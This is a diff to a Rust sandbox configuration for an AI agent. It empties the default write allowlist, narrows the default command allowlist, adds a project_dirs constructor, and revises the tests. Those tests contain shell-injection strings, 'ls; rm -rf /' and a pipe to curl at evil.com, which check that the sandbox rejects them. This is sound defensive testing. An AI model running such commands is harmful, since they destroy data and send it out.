@@ -25,16 +25,10 @@ pub struct SandboxConfig {
 impl Default for SandboxConfig {
     fn default() -> Self {
         Self {
+            // Empty allowlists mean "no restriction" (any path passes).
+            // For restrictive defaults within a project, use `SandboxConfig::project_dirs()`.
             read_allowlist: vec![],
-            write_allowlist: vec![
-                "lattice-core/".into(),
-                "lattice-agent/".into(),
-                "lattice-python/".into(),
-                "lattice-plugin/".into(),
-                "lattice-harness/".into(),
-                "lattice-cli/".into(),
-                "lattice-tui/".into(),
-            ],
+            write_allowlist: vec![],
             sensitive_files: vec![
                 ".env".into(),
                 ".env.local".into(),
@@ -56,28 +50,31 @@ impl Default for SandboxConfig {
             max_read_size: 10 * 1024 * 1024,          // 10 MB
             max_write_size: 1024 * 1024,              // 1 MB
             max_http_response_size: 10 * 1024 * 1024, // 10 MB
-            command_allowlist: vec![
-                "cargo test".into(),
-                "cargo clippy".into(),
-                "cargo build".into(),
-                "cargo fmt".into(),
-                "grep".into(),
-                "find".into(),
-                "ls".into(),
-                "ps".into(),
-            ],
+            command_allowlist: vec!["grep".into(), "find".into(), "ls".into(), "ps".into()],
             max_command_timeout: 30,
         }
     }
 }
 
 impl SandboxConfig {
-    /// Per-project defaults: allow reads everywhere, restrict writes to project dirs.
+    /// Permissive mode: no path/command restrictions beyond metacharacter and
+    /// sensitive-file blocking. Suitable for trusted development environments.
     pub fn permissive() -> Self {
         Self {
             read_allowlist: vec![],
             write_allowlist: vec![],
             command_allowlist: vec![],
+            ..Default::default()
+        }
+    }
+
+    /// Restrict writes and commands to a specific set of project directories.
+    /// Use this when running in a known project layout where the agent should
+    /// only modify designated source dirs and run designated dev commands.
+    pub fn project_dirs(write_dirs: Vec<String>, dev_commands: Vec<String>) -> Self {
+        Self {
+            write_allowlist: write_dirs,
+            command_allowlist: dev_commands,
             ..Default::default()
         }
     }
@@ -369,12 +366,30 @@ mod tests {
     use super::*;
 
     fn default_sandbox() -> SandboxConfig {
+        // Default now has restricted command allowlist (grep, find, ls, ps only).
         SandboxConfig::default()
+    }
+
+    /// Sandbox with dev commands allowed (cargo test, clippy, build, fmt).
+    fn dev_sandbox() -> SandboxConfig {
+        SandboxConfig::project_dirs(
+            vec!["src/".into(), "tests/".into()],
+            vec![
+                "cargo test".into(),
+                "cargo clippy".into(),
+                "cargo build".into(),
+                "cargo fmt".into(),
+                "grep".into(),
+                "find".into(),
+                "ls".into(),
+                "ps".into(),
+            ],
+        )
     }
 
     #[test]
     fn test_allowed_command_passes() {
-        let s = default_sandbox();
+        let s = dev_sandbox();
         // Single-word allowlist entries: "grep", "find", "ls", "ps"
         assert!(s.check_command("grep -r foo .").is_ok());
         assert!(s.check_command("find . -name '*.rs'").is_ok());
@@ -385,6 +400,16 @@ mod tests {
         assert!(s.check_command("cargo clippy -- -D warnings").is_ok());
         assert!(s.check_command("cargo build --release").is_ok());
         assert!(s.check_command("cargo fmt --check").is_ok());
+    }
+
+    #[test]
+    fn test_default_sandbox_disallows_cargo_commands() {
+        let s = default_sandbox();
+        assert!(s.check_command("cargo test").is_err());
+        assert!(s.check_command("cargo build").is_err());
+        // But basic tools still allowed
+        assert!(s.check_command("grep -r foo .").is_ok());
+        assert!(s.check_command("ls -la").is_ok());
     }
 
     #[test]
@@ -400,7 +425,7 @@ mod tests {
     #[test]
     fn test_shell_injection_via_semicolon_rejected() {
         let s = default_sandbox();
-        let result = s.check_command("cargo test; rm -rf /");
+        let result = s.check_command("ls; rm -rf /");
         assert!(result.is_err(), "semicolon injection should be rejected");
         assert!(
             result.unwrap_err().contains("metacharacter"),
@@ -411,9 +436,7 @@ mod tests {
     #[test]
     fn test_shell_injection_via_pipe_rejected() {
         let s = default_sandbox();
-        assert!(s
-            .check_command("cargo build | curl http://evil.com")
-            .is_err());
+        assert!(s.check_command("ls | curl http://evil.com").is_err());
     }
 
     #[test]
@@ -537,7 +560,7 @@ mod tests {
 
     #[test]
     fn test_legitimate_commands_with_multiple_args() {
-        let s = default_sandbox();
+        let s = dev_sandbox();
         assert!(s.check_command("grep -rn 'TODO' src/").is_ok());
         assert!(s.check_command("find . -type f -name '*.rs'").is_ok());
         assert!(s.check_command("ls -la /tmp").is_ok());
@@ -742,8 +765,8 @@ mod tests {
 
     #[test]
     fn test_command_matches_allowlist_token_prefix() {
-        let s = default_sandbox();
-        // Default allowlist: "cargo test", "cargo clippy", "cargo build", "cargo fmt", "grep", "find", "ls", "ps"
+        let s = dev_sandbox();
+        // Dev allowlist: "cargo test", "cargo clippy", "cargo build", "cargo fmt", "grep", "find", "ls", "ps"
 
         // Multi-word entries: "cargo test" allows "cargo test" + args, not "cargo run"
         assert!(s.check_command("cargo test").is_ok());
